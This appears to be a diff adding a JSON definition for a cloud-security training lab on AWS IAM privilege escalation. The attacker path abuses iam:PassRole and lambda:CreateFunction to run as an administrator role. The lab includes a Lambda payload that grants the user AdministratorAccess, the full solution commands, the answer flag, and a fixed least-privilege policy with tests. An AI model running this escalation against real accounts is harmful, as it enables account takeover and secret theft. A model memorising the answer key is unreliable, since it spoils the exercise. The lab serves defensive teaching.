@@ -1,0 +1,260 @@
+[
+  {
+    "labId": "cloud-L07",
+    "objective": "Starting as a low-privileged IAM user, abuse iam:PassRole + lambda:CreateFunction to run code as an administrator role — then fix the policy so the path no longer works.",
+    "successCriteria": [
+      "You identified the role that carries AdministratorAccess and can be passed to Lambda",
+      "You retrieved the production secret using the escalated identity",
+      "You rewrote the intern policy so PassRole is limited to a safe role, for Lambda only"
+    ],
+    "hints": [
+      "Lambda runs your code under an IAM role. Who is allowed to hand a role to Lambda?",
+      "List the roles in the account and look at what policies are attached to each. One of them is far too powerful.",
+      "Create a function that uses DataPipelineRole as its --role, invoke it, then read the secret prod/master-key."
+    ],
+    "estimatedHours": 1,
+    "resources": [
+      {
+        "title": "AWS docs: Granting a user permissions to pass a role to an AWS service",
+        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html",
+        "type": "link"
+      },
+      {
+        "title": "Rhino Security Labs: AWS IAM Privilege Escalation — Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "type": "link"
+      }
+    ],
+    "range": {
+      "scenario": "A contractor's access key for the IAM user `dev-intern` leaked in a public Git repo, and you have it. The intern is only supposed to build and test small Lambda functions, so nothing about the policy looks dangerous at first glance. Your job: work out whether a user who can create Lambda functions and pass ONE role can reach administrator in account 111122223333, prove it by reading the production secret `prod/master-key`, and then fix the policy so the path is closed. Use the terminal to explore like you would with the AWS CLI; the artifacts show you what the cloud console would.",
+      "artifacts": [
+        {
+          "name": "dev-intern-policy.json",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ReadOnlyDiscovery\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"iam:List*\",\n        \"iam:Get*\",\n        \"sts:GetCallerIdentity\",\n        \"s3:ListAllMyBuckets\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"BuildLambdas\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"lambda:CreateFunction\",\n        \"lambda:InvokeFunction\",\n        \"lambda:GetFunction\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"PassPipelineRole\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:PassRole\",\n      \"Resource\": \"arn:aws:iam::111122223333:role/DataPipelineRole\"\n    }\n  ]\n}",
+          "note": "The identity policy attached to the leaked user."
+        },
+        {
+          "name": "DataPipelineRole-trust.json",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"lambda.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}",
+          "note": "Who is allowed to assume DataPipelineRole."
+        },
+        {
+          "name": "payload.py",
+          "language": "bash",
+          "content": "import boto3\n\ndef handler(event, context):\n    iam = boto3.client(\"iam\")\n    iam.attach_user_policy(\n        UserName=\"dev-intern\",\n        PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\",\n    )\n    return {\"status\": \"dev-intern is now an admin\"}\n",
+          "note": "The code you would deploy: it runs with whatever role the function is given."
+        }
+      ],
+      "terminal": {
+        "prompt": "attacker@sandbox:~$",
+        "intro": "Configured with the leaked dev-intern access key. Region: us-east-1.",
+        "help": "Commands you can try (like the AWS CLI):\n  aws sts get-caller-identity\n  aws iam list-roles\n  aws iam list-attached-role-policies --role-name <name>\n  aws lambda create-function --function-name <n> --runtime python3.12 --role <role-arn> --handler lambda_function.handler --zip-file fileb://payload.zip\n  aws lambda invoke --function-name <n> out.json\n  aws secretsmanager get-secret-value --secret-id <id>",
+        "rules": [
+          {
+            "match": "^aws sts get-caller-identity$",
+            "sets": [
+              "whoami"
+            ],
+            "output": "{\n    \"UserId\": \"AIDAEXAMPLEINTERN0001\",\n    \"Account\": \"111122223333\",\n    \"Arn\": \"arn:aws:iam::111122223333:user/dev-intern\"\n}"
+          },
+          {
+            "match": "^aws iam list-roles$",
+            "sets": [
+              "listed_roles"
+            ],
+            "output": "{\n    \"Roles\": [\n        { \"RoleName\": \"SandboxLambdaRole\",  \"Arn\": \"arn:aws:iam::111122223333:role/SandboxLambdaRole\" },\n        { \"RoleName\": \"DataPipelineRole\",   \"Arn\": \"arn:aws:iam::111122223333:role/DataPipelineRole\" },\n        { \"RoleName\": \"AuditReadOnlyRole\",  \"Arn\": \"arn:aws:iam::111122223333:role/AuditReadOnlyRole\" }\n    ]\n}"
+          },
+          {
+            "match": "^aws iam list-attached-role-policies --role-name sandboxlambdarole$",
+            "output": "{\n    \"AttachedPolicies\": [\n        { \"PolicyName\": \"AWSLambdaBasicExecutionRole\" }\n    ]\n}"
+          },
+          {
+            "match": "^aws iam list-attached-role-policies --role-name auditreadonlyrole$",
+            "output": "{\n    \"AttachedPolicies\": [\n        { \"PolicyName\": \"SecurityAudit\" }\n    ]\n}"
+          },
+          {
+            "match": "^aws iam list-attached-role-policies --role-name datapipelinerole$",
+            "sets": [
+              "found_admin_role"
+            ],
+            "output": "{\n    \"AttachedPolicies\": [\n        { \"PolicyName\": \"AdministratorAccess\",\n          \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\" }\n    ]\n}"
+          },
+          {
+            "match": "^aws iam get-role --role-name (\\S+)$",
+            "output": "{\n    \"Role\": {\n        \"RoleName\": \"$1\",\n        \"AssumeRolePolicyDocument\": { \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"lambda.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }\n    }\n}"
+          },
+          {
+            "match": "^aws iam (list-users|create-user|attach-user-policy)\\b",
+            "output": "An error occurred (AccessDenied) when calling the IAM operation: User: arn:aws:iam::111122223333:user/dev-intern is not authorized to perform that action"
+          },
+          {
+            "match": "--role\\s+arn:aws:iam::\\d+:role/(?!DataPipelineRole\\b)(\\S+)",
+            "output": "An error occurred (AccessDeniedException) when calling the CreateFunction operation: User: arn:aws:iam::111122223333:user/dev-intern is not authorized to perform: iam:PassRole on resource: arn:aws:iam::111122223333:role/$1"
+          },
+          {
+            "match": "^aws lambda create-function --function-name (\\S+).*--role arn:aws:iam::111122223333:role/DataPipelineRole",
+            "sets": [
+              "fn_created"
+            ],
+            "output": "{\n    \"FunctionName\": \"$1\",\n    \"FunctionArn\": \"arn:aws:lambda:us-east-1:111122223333:function:$1\",\n    \"Role\": \"arn:aws:iam::111122223333:role/DataPipelineRole\",\n    \"Runtime\": \"python3.12\",\n    \"State\": \"Active\"\n}"
+          },
+          {
+            "match": "^aws lambda create-function\\b",
+            "output": "usage: aws lambda create-function --function-name <name> --runtime <rt> --role <role-arn> --handler <h> --zip-file fileb://payload.zip\nerror: --role is required"
+          },
+          {
+            "match": "^aws lambda invoke --function-name (\\S+)",
+            "requires": [
+              "fn_created"
+            ],
+            "sets": [
+              "fn_invoked"
+            ],
+            "output": "{\n    \"StatusCode\": 200,\n    \"ExecutedVersion\": \"$LATEST\"\n}\n(out.json) {\"status\": \"dev-intern is now an admin\"}"
+          },
+          {
+            "match": "^aws lambda invoke\\b",
+            "output": "An error occurred (ResourceNotFoundException) when calling the Invoke operation: Function not found. Create it first."
+          },
+          {
+            "match": "^aws secretsmanager get-secret-value --secret-id prod/master-key$",
+            "requires": [
+              "fn_invoked"
+            ],
+            "output": "{\n    \"Name\": \"prod/master-key\",\n    \"SecretString\": \"FLAG{passrole_lambda_admin_9f3a}\"\n}"
+          },
+          {
+            "match": "^aws secretsmanager ",
+            "output": "An error occurred (AccessDeniedException) when calling the GetSecretValue operation: User: arn:aws:iam::111122223333:user/dev-intern is not authorized to perform: secretsmanager:GetSecretValue"
+          }
+        ]
+      },
+      "solution": [
+        "aws sts get-caller-identity",
+        "aws iam list-roles",
+        "aws iam list-attached-role-policies --role-name DataPipelineRole",
+        "aws lambda create-function --function-name escalate --runtime python3.12 --role arn:aws:iam::111122223333:role/DataPipelineRole --handler lambda_function.handler --zip-file fileb://payload.zip",
+        "aws lambda invoke --function-name escalate out.json",
+        "aws secretsmanager get-secret-value --secret-id prod/master-key"
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "kind": "choice",
+          "prompt": "Looking at dev-intern-policy.json, which combination of permissions gives this user a path to a more powerful identity?",
+          "options": [
+            "iam:List* and iam:Get* — read-only IAM access",
+            "lambda:CreateFunction + iam:PassRole on a role that is more privileged than the user",
+            "s3:ListAllMyBuckets — listing bucket names",
+            "sts:GetCallerIdentity — checking who you are"
+          ],
+          "correct": [
+            1
+          ],
+          "explanation": "Creating a Lambda function lets you run code, and iam:PassRole lets you choose which role that code runs as. If the passable role is more powerful than you, running code as it IS privilege escalation. The read-only and identity calls only help you discover the path."
+        },
+        {
+          "id": "t2",
+          "kind": "answer",
+          "prompt": "Use the terminal to list the roles and their attached policies. What is the name of the role that has AdministratorAccess?",
+          "accept": [
+            "datapipelinerole",
+            "data pipeline role",
+            "arn:aws:iam::111122223333:role/datapipelinerole"
+          ],
+          "explanation": "DataPipelineRole carries AdministratorAccess, and its trust policy lets lambda.amazonaws.com assume it — so anyone who can pass it to Lambda can run admin code. A 'temporary' broad policy on a service role is one of the most common real-world causes of escalation."
+        },
+        {
+          "id": "t3",
+          "kind": "flag",
+          "prompt": "Perform the escalation: create a Lambda function that uses the powerful role, invoke it, then read the secret prod/master-key. Paste the flag.",
+          "flag": "FLAG{passrole_lambda_admin_9f3a}",
+          "explanation": "The function ran with DataPipelineRole's administrator permissions, so it could attach AdministratorAccess to your own user — after which Secrets Manager access worked. dev-intern never needed iam:AttachUserPolicy itself; PassRole was enough."
+        },
+        {
+          "id": "t4",
+          "kind": "choice",
+          "prompt": "Which single change to the policy best breaks the escalation while still letting the intern deploy Lambda functions?",
+          "options": [
+            "Remove lambda:InvokeFunction",
+            "Limit iam:PassRole to a low-privilege role, and only for the Lambda service",
+            "Add s3:* so the intern has less reason to use Lambda",
+            "Rename DataPipelineRole"
+          ],
+          "correct": [
+            1
+          ],
+          "explanation": "The dangerous permission is the unrestricted PassRole of a powerful role. Scoping PassRole to a safe role (and conditioning it on iam:PassedToService) keeps the intern productive while removing the path. Removing Invoke alone wouldn't help — Lambda can be triggered other ways."
+        },
+        {
+          "id": "t5",
+          "kind": "policy",
+          "mode": "identity",
+          "prompt": "Fix dev-intern's policy. The intern must still create/invoke Lambda functions and pass SandboxLambdaRole to Lambda — but must NOT be able to pass DataPipelineRole, or pass any role to a service other than Lambda.",
+          "starter": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ReadOnlyDiscovery\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"iam:List*\",\n        \"iam:Get*\",\n        \"sts:GetCallerIdentity\",\n        \"s3:ListAllMyBuckets\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"BuildLambdas\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"lambda:CreateFunction\",\n        \"lambda:InvokeFunction\",\n        \"lambda:GetFunction\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"PassPipelineRole\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:PassRole\",\n      \"Resource\": \"arn:aws:iam::111122223333:role/DataPipelineRole\"\n    }\n  ]\n}",
+          "solution": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"iam:List*\",\n        \"iam:Get*\",\n        \"sts:GetCallerIdentity\",\n        \"s3:ListAllMyBuckets\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"lambda:CreateFunction\",\n        \"lambda:InvokeFunction\",\n        \"lambda:GetFunction\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:PassRole\",\n      \"Resource\": \"arn:aws:iam::111122223333:role/SandboxLambdaRole\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"iam:PassedToService\": \"lambda.amazonaws.com\"\n        }\n      }\n    }\n  ]\n}",
+          "tests": [
+            {
+              "name": "Can still pass SandboxLambdaRole to Lambda",
+              "action": "iam:PassRole",
+              "resource": "arn:aws:iam::111122223333:role/SandboxLambdaRole",
+              "context": {
+                "iam:PassedToService": "lambda.amazonaws.com"
+              },
+              "expect": "allow"
+            },
+            {
+              "name": "Cannot pass DataPipelineRole to Lambda",
+              "action": "iam:PassRole",
+              "resource": "arn:aws:iam::111122223333:role/DataPipelineRole",
+              "context": {
+                "iam:PassedToService": "lambda.amazonaws.com"
+              },
+              "expect": "deny"
+            },
+            {
+              "name": "Cannot pass SandboxLambdaRole to EC2",
+              "action": "iam:PassRole",
+              "resource": "arn:aws:iam::111122223333:role/SandboxLambdaRole",
+              "context": {
+                "iam:PassedToService": "ec2.amazonaws.com"
+              },
+              "expect": "deny"
+            },
+            {
+              "name": "Can still create Lambda functions",
+              "action": "lambda:CreateFunction",
+              "resource": "arn:aws:lambda:us-east-1:111122223333:function:test",
+              "expect": "allow"
+            },
+            {
+              "name": "Can still check own identity",
+              "action": "sts:GetCallerIdentity",
+              "resource": "*",
+              "expect": "allow"
+            }
+          ],
+          "explanation": "Two controls close the hole: Resource restricts WHICH role can be passed, and the iam:PassedToService condition restricts WHICH service it may be passed to. Together they implement least privilege for PassRole."
+        },
+        {
+          "id": "t6",
+          "kind": "answer",
+          "prompt": "In one word or phrase: which AWS-managed policy attached to DataPipelineRole is the root cause that made passing it so dangerous?",
+          "accept": [
+            "administratoraccess",
+            "administrator access",
+            "arn:aws:iam::aws:policy/administratoraccess"
+          ],
+          "explanation": "PassRole is only as dangerous as the role being passed. Giving a service role AdministratorAccess 'to make it work' turns every PassRole grant for that role into an admin grant. Scope service roles to exactly what the workload needs."
+        }
+      ],
+      "takeaways": [
+        "iam:PassRole is a privilege-escalation primitive: the risk is the power of the role being passed, not the permission name.",
+        "Always scope PassRole to specific role ARNs and add iam:PassedToService so the role can only go to the intended service.",
+        "Audit service roles for AdministratorAccess or wildcard policies — they turn small permissions into account takeover."
+      ]
+    }
+  }
+]
